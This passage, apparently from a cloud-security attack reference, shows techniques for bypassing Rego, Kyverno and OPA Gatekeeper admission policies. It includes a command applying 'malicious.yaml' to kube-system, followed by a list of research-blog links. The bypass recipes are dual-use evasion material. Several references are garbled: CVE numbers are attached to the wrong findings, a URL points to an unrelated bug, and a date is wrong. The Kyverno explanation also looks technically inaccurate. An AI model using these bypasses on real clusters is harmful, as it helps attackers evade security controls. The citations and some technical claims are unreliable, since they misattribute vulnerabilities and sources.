# may behave differently than expected depending on Rego version.
```

```rego
# Bypass 3: Wildcard resource match
package terraform.deny

deny[msg] {
  some r
  r = input.resource.aws_security_group[_]
  contains(r.ingress.cidr_blocks[_], "0.0.0.0/0")
  msg = sprintf("SG %s is open", [r.name])
}
# Bypass: use IPv6 ::/0 -- not matched by the string contains check.
```

### 18.2 Kyverno -- bypass via generateExisting

```yaml
# Kyverno policies with generateExisting: false only apply to NEW resources.
# Existing non-compliant resources are grandfathered.
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-privileged
spec:
  validationFailureAction: Enforce
  generateExisting: false   # BYPASS: existing privileged pods are not affected
  rules:
  - name: no-privileged
    match:
      any:
      - resources:
          kinds: ["Pod"]
    validate:
      pattern:
        spec:
          containers:
          - securityContext:
              privileged: "false"
```

```bash
# Verify the bypass: pre-existing privileged pods are not flagged
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged == true) | .metadata.name'
```

### 18.3 OPA Gatekeeper -- constraint bypass via exemptNamespace

```yaml
# Many Gatekeeper constraints include exemptNamespaces for system namespaces.
# If the attacker can deploy to a system namespace (e.g., kube-system via a
# compromised service account), the constraint is bypassed.
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredLabels
metadata:
  name: must-have-team-label
spec:
  match:
    excludedNamespaces: ["kube-system", "kube-public", "kube-node-lease"]  # BYPASS
    kinds:
    - apiGroups: [""]
      kinds: ["Namespace"]
```

```bash
# Bypass: deploy to kube-system (if compromised SA has access)
kubectl apply -f malicious.yaml -n kube-system
```

### 18.4 OPA Gatekeeper -- audit mode vs enforce mode

```bash
# A constraint in dryrun/audit mode does NOT enforce -- it only logs violations.
# Verify constraint enforcement mode
kubectl get constraints.constraints.gatekeeper.sh -o json | \
  jq '.items[] | {name: .metadata.name, enforcementAction: .spec.enforcementAction}'
# enforcementAction: deny -> enforces
# enforcementAction: dryrun -> audit only (bypass possible)
```

---

## 19. Defensive References & Research Blogs

### Wiz Research

- **ChaosDB (CVE-2021-38645 sibling)**: <https://www.wiz.io/blog/chaosdb-explained-azures-cosmos-db-vulnerability-walkthrough>
- **OMIGOD (CVE-2021-38645, 38647, 38648, 38649)**: <https://www.wiz.io/blog/secret-shell-bash-vulnerability-cve-2019-9924-in-linux-macos>
- **Microsoft SAS token leak (2020)**: <https://www.wiz.io/blog/financial-data-of-millions-of-people-exposed-online>
- **BrokenSessions**: <https://www.wiz.io/blog/the-cloud-has-a-supply-chain-security-problem>
- **ExtraReplica (Azure PostgreSQL)**: <https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities>

### Palo Alto Networks Prisma Cloud

- **Cloud Threat Report**: <https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/reports/2021-cloud-security-report.pdf>
- **Unit 42 Cloud Threat Report**: <https://unit42.paloaltonetworks.com/cloud-threat-research/>

### Lacework Labs

- **Cloud Threat Reports**: <https://www.lacework.com/labs/>
- **Cloud Spider campaign**: <https://www.lacework.com/blog/cloud-spider-crypto-campaign/>

### Sysdig Threat Research

- **SCARLETEEL**: <https://sysdig.com/blog/cloud-security-scarleteel-attack/>
- **CRYSTALRAY**: <https://sysdig.com/blog/crystalray/>

### Orca Security Research

- **Super Cloud**: <https://orca.security/resources/blog/>
- **AWS Cloud Houdini**: <https://orca.security/resources/blog/aws-cloud-houdini-exposing-cloud-vulnerabilities/>

### Microsoft Defender for Cloud

- **Defender for Cloud research**: <https://www.microsoft.com/en-us/security/blog/topic/cloud-security/>

### General cloud security research

- **Capital One Breach Analysis**: <https://www.zscaler.com/resources/industry-insights/capital-one-data-breach.pdf>
- **Hacking the Cloud**: <https://hackingthe.cloud/> -- community wiki of cloud attack techniques
- **CloudSecList**: <https://cloudseclist.com/> -- weekly cloud security newsletter
- **Rhino Security Labs Blog**: <https://rhinosecuritylabs.com/blog/> -- Pacu maintainers
- **MITRE ATT&CK Cloud Matrix**: <https://attack.mitre.org/matrices/enterprise/cloud/>
